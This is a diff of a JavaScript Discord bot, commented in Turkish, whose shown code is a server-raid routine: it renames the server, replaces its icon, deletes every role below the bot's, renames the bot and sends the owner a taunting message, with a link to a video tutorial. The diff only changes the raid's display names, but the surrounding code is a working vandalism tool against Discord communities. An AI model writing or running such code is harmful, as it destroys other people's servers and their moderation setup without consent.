@@ -1250,10 +1250,10 @@ client.on("message", async msg => {
       });
     
     await msg.guild.setIcon("https://media.discordapp.net/attachments/868048636456603692/868050442112876594/Forest_1.jpg?width=960&height=600");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("AxxA Baskın Attı"); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.setName("AxxA Ayak Bastı"); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
     await client.user.setAvatar("https://media.discordapp.net/attachments/868048636456603692/868050442112876594/Forest_1.jpg?width=960&height=600"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-    await client.user.setUsername("AxxA Yok Et.");    //BOTUN ISMİNİ DEGISTIRIR
+    await client.user.setUsername("Vortex.");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.owner.send("**Sunucuna Uğradım AxxA'dan Heyyo**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
   }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
